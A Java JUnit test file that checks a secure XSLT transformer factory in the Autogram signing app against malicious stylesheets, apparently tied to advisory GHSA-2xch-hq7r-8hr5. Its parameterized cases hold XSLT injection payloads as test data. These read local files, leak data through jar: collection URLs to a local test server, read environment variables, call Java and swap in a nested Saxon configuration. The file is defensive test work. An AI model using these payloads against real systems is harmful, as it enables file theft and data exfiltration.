package digital.slovensko.autogram.util;

import com.sun.net.httpserver.HttpServer;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import javax.xml.transform.TransformerException;
import javax.xml.transform.stream.StreamResult;
import javax.xml.transform.stream.StreamSource;
import java.io.StringReader;
import java.io.StringWriter;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.concurrent.atomic.AtomicInteger;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Stylesheets come from untrusted signing requests (GHSA-2xch-hq7r-8hr5), so they must not be able to
 * read local files, reach the network, write files or read the environment.
 */
public class XMLUtilsXsltResourceAccessTest {
    private static final String SECRET = "autogram-secret-0f1e2d";

    @TempDir
    Path tempDir;

    private Path secretFile;
    private String secretFileUri;
    private String secretDirUri;
    private HttpServer server;
    private final AtomicInteger serverHits = new AtomicInteger();
    private String serverUrl;

    @BeforeEach
    public void setUp() throws Exception {
        secretFile = tempDir.resolve("secret.txt");
        Files.writeString(secretFile, SECRET);
        Files.writeString(tempDir.resolve("secret.xml"), "<s>" + SECRET + "</s>");
        Files.writeString(tempDir.resolve("secret.json"), "{\"s\":\"" + SECRET + "\"}");
        secretFileUri = secretFile.toUri().toString();
        secretDirUri = tempDir.toUri().toString();

        server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        server.createContext("/", exchange -> {
            serverHits.incrementAndGet();
            var body = "not a jar".getBytes(StandardCharsets.UTF_8);
            exchange.sendResponseHeaders(200, body.length);
            exchange.getResponseBody().write(body);
            exchange.close();
        });
        server.start();
        serverUrl = "http://127.0.0.1:" + server.getAddress().getPort() + "/";
    }

    @AfterEach
    public void tearDown() {
        server.stop(0);
    }

    private String stylesheet(String body) {
        return "<xsl:stylesheet version=\"3.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\""
                + " xmlns:map=\"http://www.w3.org/2005/xpath-functions/map\">"
                + "<xsl:output method=\"text\"/>"
                + "<xsl:template match=\"/\">" + body + "</xsl:template>"
                + "</xsl:stylesheet>";
    }

    private String fill(String body) {
        return body
                .replace("SECRET_FILE", secretFileUri)
                .replace("SECRET_DIR", secretDirUri)
                .replace("SERVER", serverUrl);
    }

    /** Returns the transformation output, or null when the transformation was rejected. */
    private String transform(String xslt) {
        try {
            var transformer = XMLUtils.getSecureTransformerFactory().newTransformer(new StreamSource(new StringReader(xslt)));
            var writer = new StringWriter();
            transformer.transform(new StreamSource(new StringReader("<foo>bar</foo>")), new StreamResult(writer));
            return writer.toString();
        } catch (Exception e) {
            return null;
        }
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "<xsl:value-of select=\"string(collection('SECRET_DIR?select=secret.txt;content-type=text/plain'))\"/>",
            "<xsl:value-of select=\"string(collection('SECRET_DIR?select=secret.xml'))\"/>",
            "<xsl:value-of select=\"string(doc('SECRET_DIRsecret.xml'))\"/>",
            "<xsl:value-of select=\"string(document('SECRET_DIRsecret.xml'))\"/>",
            "<xsl:value-of select=\"unparsed-text('SECRET_FILE')\"/>",
            "<xsl:value-of select=\"unparsed-text-lines('SECRET_FILE')\"/>",
            "<xsl:value-of select=\"json-doc('SECRET_DIRsecret.json')?s\"/>",
            "<xsl:value-of select=\"string(Q{http://saxon.sf.net/}doc('SECRET_DIRsecret.xml', map{}))\"/>",
            "<xsl:source-document href=\"SECRET_DIRsecret.xml\" streamable=\"no\"><xsl:value-of select=\".\"/></xsl:source-document>",
            "<xsl:value-of select=\"transform(map{'stylesheet-location':'SECRET_DIRsecret.xml','source-node':.})?output\"/>",
            "<xsl:try><xsl:value-of select=\"unparsed-text('jar:SECRET_FILE!/x')\"/><xsl:catch/></xsl:try>"
                    + "<xsl:value-of select=\"unparsed-text('SECRET_FILE')\"/>",
    })
    public void testStylesheetCannotReadLocalFiles(String body) {
        var output = transform(stylesheet(fill(body)));

        if (output != null)
            assertFalse(output.contains(SECRET), "Stylesheet leaked local file contents: " + output);
    }

    @ParameterizedTest
    @ValueSource(strings = {
            // advisory PoC: data smuggled out in the URL of a jar: collection
            "<xsl:try><xsl:sequence select=\"collection('jar:SERVERa.jar?proof=x!/')\"/><xsl:catch/></xsl:try>",
            "<xsl:try><xsl:sequence select=\"uri-collection('SERVER')\"/><xsl:catch/></xsl:try>",
            "<xsl:try><xsl:sequence select=\"collection('SERVER')\"/><xsl:catch/></xsl:try>",
            "<xsl:try><xsl:sequence select=\"doc('SERVER?proof=x')\"/><xsl:catch/></xsl:try>",
            "<xsl:try><xsl:sequence select=\"document('SERVER?proof=x')\"/><xsl:catch/></xsl:try>",
            "<xsl:value-of select=\"doc-available('SERVER?proof=x')\"/>",
            "<xsl:try><xsl:sequence select=\"unparsed-text('SERVER?proof=x')\"/><xsl:catch/></xsl:try>",
            "<xsl:value-of select=\"unparsed-text-available('SERVER?proof=x')\"/>",
            "<xsl:try><xsl:sequence select=\"json-doc('SERVER?proof=x')\"/><xsl:catch/></xsl:try>",
            "<xsl:try><xsl:sequence select=\"unparsed-text('jar:SERVERa.jar!/x')\"/><xsl:catch/></xsl:try>",
    })
    public void testStylesheetCannotMakeNetworkRequests(String body) {
        transform(stylesheet(fill(body)));

        assertEquals(0, serverHits.get(), "Stylesheet made an outbound HTTP request");
    }

    @Test
    public void testStylesheetCannotListLocalDirectories() {
        var output = transform(stylesheet(fill("<xsl:value-of select=\"uri-collection('SECRET_DIR')\"/>")));

        if (output != null)
            assertFalse(output.contains("secret.txt"), "Stylesheet leaked directory listing: " + output);
    }

    /**
     * A nested fn:transform() may bring its own Saxon configuration via vendor options, which would replace
     * all the restrictions set up in {@link XMLUtils#getSecureTransformerFactory()}.
     */
    private String nestedTransformReadingSecret(String transformFunction) {
        var nested = "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"3.0\">"
                + "<xsl:template name=\"xsl:initial-template\"><xsl:value-of select=\"unparsed-text(''SECRET_FILE'')\"/></xsl:template>"
                + "</xsl:stylesheet>";
        var config = "<configuration xmlns=\"http://saxon.sf.net/ns/configuration\" edition=\"HE\">"
                + "<global allowedProtocols=\"all\"/></configuration>";
        var expression = "string(" + transformFunction + "(map{"
                + "'stylesheet-text': '" + nested + "',"
                + "'initial-template': QName('http://www.w3.org/1999/XSL/Transform', 'initial-template'),"
                + "'vendor-options': map{QName('http://saxon.sf.net/', 'configuration'): parse-xml('" + config + "')/*}"
                + "})?output)";

        return fill(expression).replace("&", "&amp;").replace("<", "&lt;").replace("\"", "&quot;");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "transform",
            "transform#1",
            "function-lookup(QName('http://www.w3.org/2005/xpath-functions', 'transform'), 1)",
    })
    public void testNestedTransformCannotReplaceConfiguration(String transformFunction) {
        var output = transform(stylesheet("<xsl:value-of select=\"" + nestedTransformReadingSecret(transformFunction) + "\"/>"));

        if (output != null)
            assertFalse(output.contains(SECRET), "Nested transform leaked local file contents: " + output);
    }

    @Test
    public void testStaticNestedTransformCannotReplaceConfiguration() {
        var output = transform("<xsl:stylesheet version=\"3.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">"
                + "<xsl:variable name=\"leak\" static=\"yes\" select=\"" + nestedTransformReadingSecret("transform") + "\"/>"
                + "<xsl:output method=\"text\"/>"
                + "<xsl:template match=\"/\"><xsl:value-of select=\"$leak\"/></xsl:template>"
                + "</xsl:stylesheet>");

        if (output != null)
            assertFalse(output.contains(SECRET), "Static nested transform leaked local file contents: " + output);
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "<xsl:value-of select=\"TRANSFORM_CALL\"/>",
            "<xsl:value-of select=\"TRANSFORM_REF\"/>",
            "<xsl:value-of select=\"string(Q{http://saxon.sf.net/}doc('SECRET_DIRsecret.xml', map{}))\"/>",
            "<xsl:value-of select=\"Q{java:java.lang.System}getProperty('user.home')\"/>",
    })
    public void testNewTransformerRejectsDeniedFunctions(String body) {
        var xslt = stylesheet(fill(body)
                .replace("TRANSFORM_CALL", nestedTransformReadingSecret("transform"))
                .replace("TRANSFORM_REF", nestedTransformReadingSecret("transform#1")));

        assertThrows(TransformerException.class,
                () -> XMLUtils.getSecureTransformerFactory().newTransformer(new StreamSource(new StringReader(xslt))));
    }

    @Test
    public void testNewTransformerRejectsStaticNestedTransform() {
        var xslt = "<xsl:stylesheet version=\"3.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">"
                + "<xsl:variable name=\"leak\" static=\"yes\" select=\"" + nestedTransformReadingSecret("transform") + "\"/>"
                + "<xsl:template match=\"/\"><xsl:value-of select=\"$leak\"/></xsl:template>"
                + "</xsl:stylesheet>";

        assertThrows(TransformerException.class,
                () -> XMLUtils.getSecureTransformerFactory().newTransformer(new StreamSource(new StringReader(xslt))));
    }

    @Test
    public void testStylesheetCannotWriteFiles() {
        transform(stylesheet(fill("<xsl:result-document href=\"SECRET_DIRwritten.txt\" method=\"text\">x</xsl:result-document>")));

        assertFalse(Files.exists(tempDir.resolve("written.txt")), "Stylesheet wrote a local file");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "<xsl:value-of select=\"environment-variable('PATH')\"/>",
            "<xsl:value-of select=\"string-join(available-environment-variables())\"/>",
            "<xsl:value-of select=\"system-property('user.home')\"/>",
            "<xsl:value-of select=\"system-property('java.version')\"/>",
            "<xsl:value-of select=\"Q{java:java.lang.System}getProperty('user.home')\"/>",
            "<xsl:value-of select=\"Q{java:java.lang.Runtime}availableProcessors(Q{java:java.lang.Runtime}getRuntime())\"/>",
    })
    public void testStylesheetCannotReadEnvironmentOrCallJava(String body) {
        var output = transform(stylesheet(body));

        if (output != null)
            assertEquals("", output, "Stylesheet leaked environment or called Java");
    }

    @Test
    public void testStylesheetCannotUseXslEvaluate() {
        assertNull(transform(stylesheet("<xsl:evaluate xpath=\"'1'\"/>")), "xsl:evaluate is enabled");
    }

    @Test
    public void testStylesheetStillProducesOutput() {
        var output = transform(stylesheet("<xsl:value-of select=\"/foo\"/>"));

        assertEquals("bar", output);
    }
}
